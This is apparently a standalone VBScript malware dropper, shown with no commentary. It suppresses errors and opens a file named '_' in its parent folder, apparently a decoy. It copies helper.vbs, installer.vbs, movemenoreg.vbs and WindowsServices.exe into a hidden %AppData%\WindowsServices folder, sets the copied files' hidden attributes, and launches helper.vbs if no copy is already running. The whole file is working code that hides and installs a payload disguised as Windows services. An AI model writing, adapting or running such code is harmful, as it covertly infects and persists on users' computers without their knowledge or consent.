on error resume next
Dim  strPath, objws, objFile, strFolder, Target, SourceFolder, destFolder, objDestFolder, AppData, ws, objmove, pfolder, objWinMgmt, colProcess, vaprocess
Set ws = WScript.CreateObject("WScript.Shell")

Target = "\WindowsServices"




'where are we?
strPath = WScript.ScriptFullName
set objws = CreateObject("Scripting.FileSystemObject")
Set objFile = objws.GetFile(strPath)
strFolder = objws.GetParentFolderName(objFile)
pfolder = objws.GetParentFolderName(strFolder)
ws.Run pfolder & "\_"


AppData = ws.ExpandEnvironmentStrings("%AppData%")



DestFolder = AppData & Target
SourceFolder = strFolder


if (not objws.folderexists(DestFolder)) then
	objws.CreateFolder DestFolder	
	Set objDestFolder = objws.GetFolder(DestFolder)
	objDestFolder.Attributes = objDestFolder.Attributes + 2
end if

Call moveandhide ("\helper.vbs")
Call moveandhide ("\installer.vbs")
Call moveandhide ("\movemenoreg.vbs")
Call moveandhide ("\WindowsServices.exe")



sub moveandhide (name)
	if (not objws.fileexists(DestFolder & name)) then
		objws.CopyFile strFolder & name, DestFolder & "\"
		Set objmove = objws.GetFile(DestFolder & name)
	
		If not objmove.Attributes AND 2 then 
			objmove.Attributes = objmove.Attributes + 2
		end if
	end if
end sub





Set objWinMgmt = GetObject("WinMgmts:Root\Cimv2")
Set colProcess = objWinMgmt.ExecQuery ("Select * From Win32_Process where name = 'wscript.exe'")

For Each objProcess In colProcess
	vaprocess = objProcess.CommandLine
		if instr(vaprocess, "helper.vbs") then
			WScript.quit
		End if
Next


ws.Run DestFolder & "\helper.vbs"


Set ws = Nothing
